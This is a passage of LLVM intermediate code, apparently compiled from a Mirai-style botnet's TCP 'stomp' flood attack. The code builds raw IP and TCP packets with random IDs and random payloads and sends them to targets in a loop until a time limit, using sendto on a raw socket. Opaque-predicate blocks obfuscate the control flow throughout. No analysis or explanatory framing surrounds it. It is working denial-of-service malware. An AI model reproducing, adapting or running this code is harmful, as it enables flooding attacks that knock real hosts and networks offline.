  %470 = load i32, i32* %469, align 4
  %471 = call i32 @ntohl(i32 %470) #7
  %472 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %21, align 8
  %473 = load i32, i32* %19, align 4
  %474 = sext i32 %473 to i64
  %475 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %472, i64 %474
  %476 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %475, i32 0, i32 1
  store i32 %471, i32* %476, align 4
  %477 = load %struct.tcphdr*, %struct.tcphdr** %48, align 8
  %478 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %477, i32 0, i32 3
  %479 = load i32, i32* %478, align 4
  %480 = call i32 @ntohl(i32 %479) #7
  %481 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %21, align 8
  %482 = load i32, i32* %19, align 4
  %483 = sext i32 %482 to i64
  %484 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %481, i64 %483
  %485 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %484, i32 0, i32 2
  store i32 %480, i32* %485, align 4
  %486 = load %struct.tcphdr*, %struct.tcphdr** %48, align 8
  %487 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %486, i32 0, i32 1
  %488 = load i16, i16* %487, align 2
  %489 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %21, align 8
  %490 = load i32, i32* %19, align 4
  %491 = sext i32 %490 to i64
  %492 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %489, i64 %491
  %493 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %492, i32 0, i32 3
  store i16 %488, i16* %493, align 4
  %494 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %38, i32 0, i32 1
  %495 = load i16, i16* %494, align 2
  %496 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %21, align 8
  %497 = load i32, i32* %19, align 4
  %498 = sext i32 %497 to i64
  %499 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %496, i64 %498
  %500 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %499, i32 0, i32 4
  store i16 %495, i16* %500, align 2
  %501 = load i32, i32* %34, align 4
  %502 = sext i32 %501 to i64
  %503 = add i64 40, %502
  %504 = call noalias i8* @malloc(i64 %503) #6
  %505 = load i8**, i8*** %22, align 8
  %506 = load i32, i32* %19, align 4
  %507 = sext i32 %506 to i64
  %508 = getelementptr inbounds i8*, i8** %505, i64 %507
  store i8* %504, i8** %508, align 8
  %509 = load i8**, i8*** %22, align 8
  %510 = load i32, i32* %19, align 4
  %511 = sext i32 %510 to i64
  %512 = getelementptr inbounds i8*, i8** %509, i64 %511
  %513 = load i8*, i8** %512, align 8
  %514 = bitcast i8* %513 to %struct.iphdr*
  store %struct.iphdr* %514, %struct.iphdr** %47, align 8
  %515 = load %struct.iphdr*, %struct.iphdr** %47, align 8
  %516 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %515, i64 1
  %517 = bitcast %struct.iphdr* %516 to %struct.tcphdr*
  store %struct.tcphdr* %517, %struct.tcphdr** %48, align 8
  %518 = load %struct.tcphdr*, %struct.tcphdr** %48, align 8
  %519 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %518, i64 1
  %520 = bitcast %struct.tcphdr* %519 to i8*
  store i8* %520, i8** %49, align 8
  %521 = load %struct.iphdr*, %struct.iphdr** %47, align 8
  %522 = bitcast %struct.iphdr* %521 to i8*
  %523 = load i8, i8* %522, align 4
  %524 = and i8 %523, 15
  %525 = or i8 %524, 64
  store i8 %525, i8* %522, align 4
  %526 = load %struct.iphdr*, %struct.iphdr** %47, align 8
  %527 = bitcast %struct.iphdr* %526 to i8*
  %528 = load i8, i8* %527, align 4
  %529 = and i8 %528, -16
  %530 = or i8 %529, 5
  store i8 %530, i8* %527, align 4
  %531 = load i8, i8* %23, align 1
  %532 = load %struct.iphdr*, %struct.iphdr** %47, align 8
  %533 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %532, i32 0, i32 1
  store i8 %531, i8* %533, align 1
  %534 = load i32, i32* %34, align 4
  %535 = sext i32 %534 to i64
  %536 = add i64 40, %535
  %537 = trunc i64 %536 to i16
  %538 = call zeroext i16 @htons(i16 zeroext %537) #7
  %539 = load %struct.iphdr*, %struct.iphdr** %47, align 8
  %540 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %539, i32 0, i32 2
  store i16 %538, i16* %540, align 2
  %541 = load i16, i16* %24, align 2
  %542 = call zeroext i16 @htons(i16 zeroext %541) #7
  %543 = load %struct.iphdr*, %struct.iphdr** %47, align 8
  %544 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %543, i32 0, i32 3
  store i16 %542, i16* %544, align 4
  %545 = load i8, i8* %25, align 1
  %546 = load %struct.iphdr*, %struct.iphdr** %47, align 8
  %547 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %546, i32 0, i32 5
  store i8 %545, i8* %547, align 4
  %548 = load i8, i8* %26, align 1
  %549 = icmp ne i8 %548, 0
  br i1 %549, label %550, label %570

; <label>:550:                                    ; preds = %459
  %551 = load i32, i32* @x.27
  %552 = load i32, i32* @y.28
  %553 = sub i32 %551, 1
  %554 = mul i32 %551, %553
  %555 = urem i32 %554, 2
  %556 = icmp eq i32 %555, 0
  %557 = icmp slt i32 %552, 10
  %558 = or i1 %556, %557
  br i1 %558, label %originalBB89, label %originalBB89alteredBB

originalBB89:                                     ; preds = %originalBB89alteredBB, %550
  %559 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %560 = load %struct.iphdr*, %struct.iphdr** %47, align 8
  %561 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %560, i32 0, i32 4
  store i16 %559, i16* %561, align 2
  %562 = load i32, i32* @x.27
  %563 = load i32, i32* @y.28
  %564 = sub i32 %562, 1
  %565 = mul i32 %562, %564
  %566 = urem i32 %565, 2
  %567 = icmp eq i32 %566, 0
  %568 = icmp slt i32 %563, 10
  %569 = or i1 %567, %568
  br i1 %569, label %originalBBpart291, label %originalBB89alteredBB

originalBBpart291:                                ; preds = %originalBB89
  br label %570

; <label>:570:                                    ; preds = %originalBBpart291, %459
  %571 = load %struct.iphdr*, %struct.iphdr** %47, align 8
  %572 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %571, i32 0, i32 6
  store i8 6, i8* %572, align 1
  %573 = load i32, i32* @LOCAL_ADDR, align 4
  %574 = load %struct.iphdr*, %struct.iphdr** %47, align 8
  %575 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %574, i32 0, i32 8
  store i32 %573, i32* %575, align 4
  %576 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %21, align 8
  %577 = load i32, i32* %19, align 4
  %578 = sext i32 %577 to i64
  %579 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %576, i64 %578
  %580 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %579, i32 0, i32 0
  %581 = load i32, i32* %580, align 4
  %582 = load %struct.iphdr*, %struct.iphdr** %47, align 8
  %583 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %582, i32 0, i32 9
  store i32 %581, i32* %583, align 4
  %584 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %21, align 8
  %585 = load i32, i32* %19, align 4
  %586 = sext i32 %585 to i64
  %587 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %584, i64 %586
  %588 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %587, i32 0, i32 3
  %589 = load i16, i16* %588, align 4
  %590 = load %struct.tcphdr*, %struct.tcphdr** %48, align 8
  %591 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %590, i32 0, i32 0
  store i16 %589, i16* %591, align 4
  %592 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %21, align 8
  %593 = load i32, i32* %19, align 4
  %594 = sext i32 %593 to i64
  %595 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %592, i64 %594
  %596 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %595, i32 0, i32 4
  %597 = load i16, i16* %596, align 2
  %598 = load %struct.tcphdr*, %struct.tcphdr** %48, align 8
  %599 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %598, i32 0, i32 1
  store i16 %597, i16* %599, align 2
  %600 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %21, align 8
  %601 = load i32, i32* %19, align 4
  %602 = sext i32 %601 to i64
  %603 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %600, i64 %602
  %604 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %603, i32 0, i32 2
  %605 = load i32, i32* %604, align 4
  %606 = load %struct.tcphdr*, %struct.tcphdr** %48, align 8
  %607 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %606, i32 0, i32 2
  store i32 %605, i32* %607, align 4
  %608 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %21, align 8
  %609 = load i32, i32* %19, align 4
  %610 = sext i32 %609 to i64
  %611 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %608, i64 %610
  %612 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %611, i32 0, i32 1
  %613 = load i32, i32* %612, align 4
  %614 = load %struct.tcphdr*, %struct.tcphdr** %48, align 8
  %615 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %614, i32 0, i32 3
  store i32 %613, i32* %615, align 4
  %616 = load %struct.tcphdr*, %struct.tcphdr** %48, align 8
  %617 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %616, i32 0, i32 4
  %618 = load i16, i16* %617, align 4
  %619 = and i16 %618, -241
  %620 = or i16 %619, 128
  store i16 %620, i16* %617, align 4
  %621 = load %struct.tcphdr*, %struct.tcphdr** %48, align 8
  %622 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %621, i32 0, i32 4
  %623 = load i16, i16* %622, align 4
  %624 = and i16 %623, -257
  %625 = or i16 %624, 256
  store i16 %625, i16* %622, align 4
  %626 = load %struct.tcphdr*, %struct.tcphdr** %48, align 8
  %627 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %626, i32 0, i32 4
  %628 = load i16, i16* %627, align 4
  %629 = and i16 %628, -4097
  %630 = or i16 %629, 4096
  store i16 %630, i16* %627, align 4
  %631 = call i32 @rand_next()
  %632 = and i32 %631, 65535
  %633 = trunc i32 %632 to i16
  %634 = load %struct.tcphdr*, %struct.tcphdr** %48, align 8
  %635 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %634, i32 0, i32 5
  store i16 %633, i16* %635, align 2
  %636 = load i8, i8* %28, align 1
  %637 = sext i8 %636 to i16
  %638 = load %struct.tcphdr*, %struct.tcphdr** %48, align 8
  %639 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %638, i32 0, i32 4
  %640 = load i16, i16* %639, align 4
  %641 = and i16 %637, 1
  %642 = shl i16 %641, 13
  %643 = and i16 %640, -8193
  %644 = or i16 %643, %642
  store i16 %644, i16* %639, align 4
  %645 = load i8, i8* %29, align 1
  %646 = sext i8 %645 to i16
  %647 = load %struct.tcphdr*, %struct.tcphdr** %48, align 8
  %648 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %647, i32 0, i32 4
  %649 = load i16, i16* %648, align 4
  %650 = and i16 %646, 1
  %651 = shl i16 %650, 12
  %652 = and i16 %649, -4097
  %653 = or i16 %652, %651
  store i16 %653, i16* %648, align 4
  %654 = load i8, i8* %30, align 1
  %655 = sext i8 %654 to i16
  %656 = load %struct.tcphdr*, %struct.tcphdr** %48, align 8
  %657 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %656, i32 0, i32 4
  %658 = load i16, i16* %657, align 4
  %659 = and i16 %655, 1
  %660 = shl i16 %659, 11
  %661 = and i16 %658, -2049
  %662 = or i16 %661, %660
  store i16 %662, i16* %657, align 4
  %663 = load i8, i8* %31, align 1
  %664 = sext i8 %663 to i16
  %665 = load %struct.tcphdr*, %struct.tcphdr** %48, align 8
  %666 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %665, i32 0, i32 4
  %667 = load i16, i16* %666, align 4
  %668 = and i16 %664, 1
  %669 = shl i16 %668, 10
  %670 = and i16 %667, -1025
  %671 = or i16 %670, %669
  store i16 %671, i16* %666, align 4
  %672 = load i8, i8* %32, align 1
  %673 = sext i8 %672 to i16
  %674 = load %struct.tcphdr*, %struct.tcphdr** %48, align 8
  %675 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %674, i32 0, i32 4
  %676 = load i16, i16* %675, align 4
  %677 = and i16 %673, 1
  %678 = shl i16 %677, 9
  %679 = and i16 %676, -513
  %680 = or i16 %679, %678
  store i16 %680, i16* %675, align 4
  %681 = load i8, i8* %33, align 1
  %682 = sext i8 %681 to i16
  %683 = load %struct.tcphdr*, %struct.tcphdr** %48, align 8
  %684 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %683, i32 0, i32 4
  %685 = load i16, i16* %684, align 4
  %686 = and i16 %682, 1
  %687 = shl i16 %686, 8
  %688 = and i16 %685, -257
  %689 = or i16 %688, %687
  store i16 %689, i16* %684, align 4
  %690 = load i8*, i8** %49, align 8
  %691 = load i32, i32* %34, align 4
  call void @rand_alphastr(i8* %690, i32 %691)
  %692 = load i8*, i8** %49, align 8
  %693 = load i32, i32* %34, align 4
  %694 = sext i32 %693 to i64
  %695 = getelementptr inbounds i8, i8* %692, i64 %694
  store i8 0, i8* %695, align 1
  br label %759

; <label>:696:                                    ; preds = %originalBBpart287, %427
  %697 = load %struct.tcphdr*, %struct.tcphdr** %46, align 8
  %698 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %697, i32 0, i32 4
  %699 = load i16, i16* %698, align 4
  %700 = lshr i16 %699, 8
  %701 = and i16 %700, 1
  %702 = zext i16 %701 to i32
  %703 = icmp ne i32 %702, 0
  br i1 %703, label %712, label %704

; <label>:704:                                    ; preds = %696
  %705 = load %struct.tcphdr*, %struct.tcphdr** %46, align 8
  %706 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %705, i32 0, i32 4
  %707 = load i16, i16* %706, align 4
  %708 = lshr i16 %707, 10
  %709 = and i16 %708, 1
  %710 = zext i16 %709 to i32
  %711 = icmp ne i32 %710, 0
  br i1 %711, label %712, label %731

; <label>:712:                                    ; preds = %704, %696
  %713 = load i32, i32* @x.27
  %714 = load i32, i32* @y.28
  %715 = sub i32 %713, 1
  %716 = mul i32 %713, %715
  %717 = urem i32 %716, 2
  %718 = icmp eq i32 %717, 0
  %719 = icmp slt i32 %714, 10
  %720 = or i1 %718, %719
  br i1 %720, label %originalBB93, label %originalBB93alteredBB

originalBB93:                                     ; preds = %originalBB93alteredBB, %712
  %721 = load i32, i32* %37, align 4
  %722 = call i32 @close(i32 %721)
  %723 = load i32, i32* @x.27
  %724 = load i32, i32* @y.28
  %725 = sub i32 %723, 1
  %726 = mul i32 %723, %725
  %727 = urem i32 %726, 2
  %728 = icmp eq i32 %727, 0
  %729 = icmp slt i32 %724, 10
  %730 = or i1 %728, %729
  br i1 %730, label %originalBBpart295, label %originalBB93alteredBB

originalBBpart295:                                ; preds = %originalBB93
  br label %193

; <label>:731:                                    ; preds = %704
  br label %732

; <label>:732:                                    ; preds = %731
  br label %733

; <label>:733:                                    ; preds = %732, %originalBBpart271
  br label %734

; <label>:734:                                    ; preds = %733, %originalBBpart267, %originalBBpart263
  %735 = load i32, i32* @x.27
  %736 = load i32, i32* @y.28
  %737 = sub i32 %735, 1
  %738 = mul i32 %735, %737
  %739 = urem i32 %738, 2
  %740 = icmp eq i32 %739, 0
  %741 = icmp slt i32 %736, 10
  %742 = or i1 %740, %741
  br i1 %742, label %originalBB97, label %originalBB97alteredBB

originalBB97:                                     ; preds = %originalBB97alteredBB, %734
  %743 = call i64 @time(i64* null) #6
  %744 = load i64, i64* %42, align 8
  %745 = sub nsw i64 %743, %744
  %746 = icmp sgt i64 %745, 10
  %747 = load i32, i32* @x.27
  %748 = load i32, i32* @y.28
  %749 = sub i32 %747, 1
  %750 = mul i32 %747, %749
  %751 = urem i32 %750, 2
  %752 = icmp eq i32 %751, 0
  %753 = icmp slt i32 %748, 10
  %754 = or i1 %752, %753
  br i1 %754, label %originalBBpart2109, label %originalBB97alteredBB

originalBBpart2109:                               ; preds = %originalBB97
  br i1 %746, label %755, label %758

; <label>:755:                                    ; preds = %originalBBpart2109
  %756 = load i32, i32* %37, align 4
  %757 = call i32 @close(i32 %756)
  br label %193

; <label>:758:                                    ; preds = %originalBBpart2109
  br label %311

; <label>:759:                                    ; preds = %570
  br label %760

; <label>:760:                                    ; preds = %759, %196
  %761 = load i32, i32* @x.27
  %762 = load i32, i32* @y.28
  %763 = sub i32 %761, 1
  %764 = mul i32 %761, %763
  %765 = urem i32 %764, 2
  %766 = icmp eq i32 %765, 0
  %767 = icmp slt i32 %762, 10
  %768 = or i1 %766, %767
  br i1 %768, label %originalBB111, label %originalBB111alteredBB

originalBB111:                                    ; preds = %originalBB111alteredBB, %760
  %769 = load i32, i32* %19, align 4
  %770 = add nsw i32 %769, 1
  store i32 %770, i32* %19, align 4
  %771 = load i32, i32* @x.27
  %772 = load i32, i32* @y.28
  %773 = sub i32 %771, 1
  %774 = mul i32 %771, %773
  %775 = urem i32 %774, 2
  %776 = icmp eq i32 %775, 0
  %777 = icmp slt i32 %772, 10
  %778 = or i1 %776, %777
  br i1 %778, label %originalBBpart2119, label %originalBB111alteredBB

originalBBpart2119:                               ; preds = %originalBB111
  br label %155

; <label>:779:                                    ; preds = %originalBBpart218
  br label %780

; <label>:780:                                    ; preds = %originalBBpart2135, %779
  store i32 0, i32* %19, align 4
  br label %781

; <label>:781:                                    ; preds = %939, %780
  %782 = load i32, i32* %19, align 4
  %783 = load i8, i8* %15, align 1
  %784 = zext i8 %783 to i32
  %785 = icmp slt i32 %782, %784
  br i1 %785, label %786, label %942

; <label>:786:                                    ; preds = %781
  %787 = load i32, i32* @x.27
  %788 = load i32, i32* @y.28
  %789 = sub i32 %787, 1
  %790 = mul i32 %787, %789
  %791 = urem i32 %790, 2
  %792 = icmp eq i32 %791, 0
  %793 = icmp slt i32 %788, 10
  %794 = or i1 %792, %793
  br i1 %794, label %originalBB121, label %originalBB121alteredBB

originalBB121:                                    ; preds = %originalBB121alteredBB, %786
  %795 = load i8**, i8*** %22, align 8
  %796 = load i32, i32* %19, align 4
  %797 = sext i32 %796 to i64
  %798 = getelementptr inbounds i8*, i8** %795, i64 %797
  %799 = load i8*, i8** %798, align 8
  store i8* %799, i8** %50, align 8
  %800 = load i8*, i8** %50, align 8
  %801 = bitcast i8* %800 to %struct.iphdr*
  store %struct.iphdr* %801, %struct.iphdr** %51, align 8
  %802 = load %struct.iphdr*, %struct.iphdr** %51, align 8
  %803 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %802, i64 1
  %804 = bitcast %struct.iphdr* %803 to %struct.tcphdr*
  store %struct.tcphdr* %804, %struct.tcphdr** %52, align 8
  %805 = load %struct.tcphdr*, %struct.tcphdr** %52, align 8
  %806 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %805, i64 1
  %807 = bitcast %struct.tcphdr* %806 to i8*
  store i8* %807, i8** %53, align 8
  %808 = load i16, i16* %24, align 2
  %809 = zext i16 %808 to i32
  %810 = icmp eq i32 %809, 65535
  %811 = load i32, i32* @x.27
  %812 = load i32, i32* @y.28
  %813 = sub i32 %811, 1
  %814 = mul i32 %811, %813
  %815 = urem i32 %814, 2
  %816 = icmp eq i32 %815, 0
  %817 = icmp slt i32 %812, 10
  %818 = or i1 %816, %817
  br i1 %818, label %originalBBpart2123, label %originalBB121alteredBB

originalBBpart2123:                               ; preds = %originalBB121
  br i1 %810, label %819, label %825

; <label>:819:                                    ; preds = %originalBBpart2123
  %820 = call i32 @rand_next()
  %821 = and i32 %820, 65535
  %822 = trunc i32 %821 to i16
  %823 = load %struct.iphdr*, %struct.iphdr** %51, align 8
  %824 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %823, i32 0, i32 3
  store i16 %822, i16* %824, align 4
  br label %825

; <label>:825:                                    ; preds = %819, %originalBBpart2123
  %826 = load i32, i32* @x.27
  %827 = load i32, i32* @y.28
  %828 = sub i32 %826, 1
  %829 = mul i32 %826, %828
  %830 = urem i32 %829, 2
  %831 = icmp eq i32 %830, 0
  %832 = icmp slt i32 %827, 10
  %833 = or i1 %831, %832
  br i1 %833, label %originalBB125, label %originalBB125alteredBB

originalBB125:                                    ; preds = %originalBB125alteredBB, %825
  %834 = load i8, i8* %35, align 1
  %835 = icmp ne i8 %834, 0
  %836 = load i32, i32* @x.27
  %837 = load i32, i32* @y.28
  %838 = sub i32 %836, 1
  %839 = mul i32 %836, %838
  %840 = urem i32 %839, 2
  %841 = icmp eq i32 %840, 0
  %842 = icmp slt i32 %837, 10
  %843 = or i1 %841, %842
  br i1 %843, label %originalBBpart2127, label %originalBB125alteredBB

originalBBpart2127:                               ; preds = %originalBB125
  br i1 %835, label %844, label %867

; <label>:844:                                    ; preds = %originalBBpart2127
  %845 = load i32, i32* @x.27
  %846 = load i32, i32* @y.28
  %847 = sub i32 %845, 1
  %848 = mul i32 %845, %847
  %849 = urem i32 %848, 2
  %850 = icmp eq i32 %849, 0
  %851 = icmp slt i32 %846, 10
  %852 = or i1 %850, %851
  br i1 %852, label %originalBB129, label %originalBB129alteredBB

originalBB129:                                    ; preds = %originalBB129alteredBB, %844
  %853 = load i8*, i8** %53, align 8
  %854 = load i32, i32* %34, align 4
  call void @rand_alphastr(i8* %853, i32 %854)
  %855 = load i8*, i8** %53, align 8
  %856 = load i32, i32* %34, align 4
  %857 = sext i32 %856 to i64
  %858 = getelementptr inbounds i8, i8* %855, i64 %857
  store i8 0, i8* %858, align 1
  %859 = load i32, i32* @x.27
  %860 = load i32, i32* @y.28
  %861 = sub i32 %859, 1
  %862 = mul i32 %859, %861
  %863 = urem i32 %862, 2
  %864 = icmp eq i32 %863, 0
  %865 = icmp slt i32 %860, 10
  %866 = or i1 %864, %865
  br i1 %866, label %originalBBpart2131, label %originalBB129alteredBB

originalBBpart2131:                               ; preds = %originalBB129
  br label %867

; <label>:867:                                    ; preds = %originalBBpart2131, %originalBBpart2127
  %868 = load %struct.iphdr*, %struct.iphdr** %51, align 8
  %869 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %868, i32 0, i32 7
  store i16 0, i16* %869, align 2
  %870 = load %struct.iphdr*, %struct.iphdr** %51, align 8
  %871 = bitcast %struct.iphdr* %870 to i16*
  %872 = call zeroext i16 @checksum_generic(i16* %871, i32 20)
  %873 = load %struct.iphdr*, %struct.iphdr** %51, align 8
  %874 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %873, i32 0, i32 7
  store i16 %872, i16* %874, align 2
  %875 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %21, align 8
  %876 = load i32, i32* %19, align 4
  %877 = sext i32 %876 to i64
  %878 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %875, i64 %877
  %879 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %878, i32 0, i32 1
  %880 = load i32, i32* %879, align 4
  %881 = add i32 %880, 1
  store i32 %881, i32* %879, align 4
  %882 = trunc i32 %880 to i16
  %883 = call zeroext i16 @htons(i16 zeroext %882) #7
  %884 = zext i16 %883 to i32
  %885 = load %struct.tcphdr*, %struct.tcphdr** %52, align 8
  %886 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %885, i32 0, i32 2
  store i32 %884, i32* %886, align 4
  %887 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %21, align 8
  %888 = load i32, i32* %19, align 4
  %889 = sext i32 %888 to i64
  %890 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %887, i64 %889
  %891 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %890, i32 0, i32 2
  %892 = load i32, i32* %891, align 4
  %893 = trunc i32 %892 to i16
  %894 = call zeroext i16 @htons(i16 zeroext %893) #7
  %895 = zext i16 %894 to i32
  %896 = load %struct.tcphdr*, %struct.tcphdr** %52, align 8
  %897 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %896, i32 0, i32 3
  store i32 %895, i32* %897, align 4
  %898 = load %struct.tcphdr*, %struct.tcphdr** %52, align 8
  %899 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %898, i32 0, i32 6
  store i16 0, i16* %899, align 4
  %900 = load %struct.iphdr*, %struct.iphdr** %51, align 8
  %901 = load %struct.tcphdr*, %struct.tcphdr** %52, align 8
  %902 = bitcast %struct.tcphdr* %901 to i8*
  %903 = load i32, i32* %34, align 4
  %904 = sext i32 %903 to i64
  %905 = add i64 20, %904
  %906 = trunc i64 %905 to i16
  %907 = call zeroext i16 @htons(i16 zeroext %906) #7
  %908 = load i32, i32* %34, align 4
  %909 = sext i32 %908 to i64
  %910 = add i64 20, %909
  %911 = trunc i64 %910 to i32
  %912 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %900, i8* %902, i16 zeroext %907, i32 %911)
  %913 = load %struct.tcphdr*, %struct.tcphdr** %52, align 8
  %914 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %913, i32 0, i32 6
  store i16 %912, i16* %914, align 4
  %915 = load %struct.tcphdr*, %struct.tcphdr** %52, align 8
  %916 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %915, i32 0, i32 1
  %917 = load i16, i16* %916, align 2
  %918 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %919 = load i32, i32* %19, align 4
  %920 = sext i32 %919 to i64
  %921 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %918, i64 %920
  %922 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %921, i32 0, i32 0
  %923 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %922, i32 0, i32 1
  store i16 %917, i16* %923, align 2
  %924 = load i32, i32* %20, align 4
  %925 = load i8*, i8** %50, align 8
  %926 = load i32, i32* %34, align 4
  %927 = sext i32 %926 to i64
  %928 = add i64 40, %927
  %929 = bitcast %union.__CONST_SOCKADDR_ARG* %54 to %struct.sockaddr**
  %930 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %931 = load i32, i32* %19, align 4
  %932 = sext i32 %931 to i64
  %933 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %930, i64 %932
  %934 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %933, i32 0, i32 0
  %935 = bitcast %struct.sockaddr_in* %934 to %struct.sockaddr*
  store %struct.sockaddr* %935, %struct.sockaddr** %929, align 8
  %936 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %54, i32 0, i32 0
  %937 = load %struct.sockaddr*, %struct.sockaddr** %936, align 8
  %938 = call i64 @sendto(i32 %924, i8* %925, i64 %928, i32 16384, %struct.sockaddr* %937, i32 16)
  br label %939

; <label>:939:                                    ; preds = %867
  %940 = load i32, i32* %19, align 4
  %941 = add nsw i32 %940, 1
  store i32 %941, i32* %19, align 4
  br label %781

; <label>:942:                                    ; preds = %781
  %943 = call i64 @time(i64* null) #6
  %944 = load i32, i32* %36, align 4
  %945 = sext i32 %944 to i64
  %946 = icmp sgt i64 %943, %945
  br i1 %946, label %947, label %948

; <label>:947:                                    ; preds = %942
  br label %965

; <label>:948:                                    ; preds = %942
  %949 = load i32, i32* @x.27
  %950 = load i32, i32* @y.28
  %951 = sub i32 %949, 1
  %952 = mul i32 %949, %951
  %953 = urem i32 %952, 2
  %954 = icmp eq i32 %953, 0
  %955 = icmp slt i32 %950, 10
  %956 = or i1 %954, %955
  br i1 %956, label %originalBB133, label %originalBB133alteredBB

originalBB133:                                    ; preds = %originalBB133alteredBB, %948
  %957 = load i32, i32* @x.27
  %958 = load i32, i32* @y.28
  %959 = sub i32 %957, 1
  %960 = mul i32 %957, %959
  %961 = urem i32 %960, 2
  %962 = icmp eq i32 %961, 0
  %963 = icmp slt i32 %958, 10
  %964 = or i1 %962, %963
  br i1 %964, label %originalBBpart2135, label %originalBB133alteredBB

originalBBpart2135:                               ; preds = %originalBB133
  br label %780

; <label>:965:                                    ; preds = %947, %originalBBpart259, %151, %129
  %966 = load i32, i32* @x.27
  %967 = load i32, i32* @y.28
  %968 = sub i32 %966, 1
  %969 = mul i32 %966, %968
  %970 = urem i32 %969, 2
  %971 = icmp eq i32 %970, 0
  %972 = icmp slt i32 %967, 10
  %973 = or i1 %971, %972
  br i1 %973, label %originalBB137, label %originalBB137alteredBB

originalBB137:                                    ; preds = %originalBB137alteredBB, %965
  %974 = load i32, i32* @x.27
  %975 = load i32, i32* @y.28
  %976 = sub i32 %974, 1
  %977 = mul i32 %974, %976
  %978 = urem i32 %977, 2
  %979 = icmp eq i32 %978, 0
  %980 = icmp slt i32 %975, 10
  %981 = or i1 %979, %980
  br i1 %981, label %originalBBpart2139, label %originalBB137alteredBB

originalBBpart2139:                               ; preds = %originalBB137
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %5
  %982 = alloca i32, align 4
  %983 = alloca i8, align 1
  %984 = alloca %struct.attack_target*, align 8
  %985 = alloca i8, align 1
  %986 = alloca %struct.attack_option*, align 8
  %987 = alloca i32, align 4
  %988 = alloca i32, align 4
  %989 = alloca %struct.attack_stomp_data*, align 8
  %990 = alloca i8**, align 8
  %991 = alloca i8, align 1
  %992 = alloca i16, align 2
  %993 = alloca i8, align 1
